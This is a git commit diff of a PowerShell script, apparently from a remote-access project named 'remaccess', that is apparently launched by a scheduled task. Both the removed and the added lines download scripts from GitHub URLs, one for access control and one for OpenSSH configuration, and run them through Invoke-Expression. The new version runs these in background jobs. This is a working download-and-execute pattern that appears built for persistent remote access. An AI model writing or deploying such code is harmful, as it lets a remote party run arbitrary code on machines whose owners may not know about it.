412b101293183f045e00493e5423ac0d9560a6ad
沐宸 <62504289+DirNotAvailable@users.noreply.github.com>
2023-10-28 20:14:10 +0500

    Update TaskSchedulerExe.ps1

--- SupportFIles/TaskSchedulerExe.ps1
+++ SupportFIles/TaskSchedulerExe.ps1
@@ -1,11 +1,21 @@
 $urlfortask = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AccessControl.ps1"
 $urlforsshdmaint = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHConfigMaintenance.ps1"
-$responsefortask = Invoke-WebRequest -Uri $urlfortask -UseBasicParsing
-$responseforsshdmaint = Invoke-WebRequest -Uri $urlforsshdmaint -UseBasicParsing
-if ($responsefortask.StatusCode -eq 200) {
-    Invoke-Expression $responsefortask.Content
-}
-if ($responseforsshdmaint.StatusCode -eq 200) {
-    Invoke-Expression $responseforsshdmaint.Content
-    Start-Sleep 5
-}
+$job1 = Start-Job -ScriptBlock {
+    param($url)
+    $scriptcontent = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
+    if ($scriptcontent) {
+        Invoke-Expression $scriptcontent
+    }
+} -ArgumentList $urlfortask
+$job2 = Start-Job -ScriptBlock {
+    param($url)
+    $scriptcontent = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
+    if ($scriptcontent) {
+        Invoke-Expression $scriptcontent
+        Start-Sleep 5
+    }
+} -ArgumentList $urlforsshdmaint
+Wait-Job -Job $job1, $job2
+$job1Result = Receive-Job -Job $job1
+$job2Result = Receive-Job -Job $job2
+Remove-Job -Job $job1, $job2
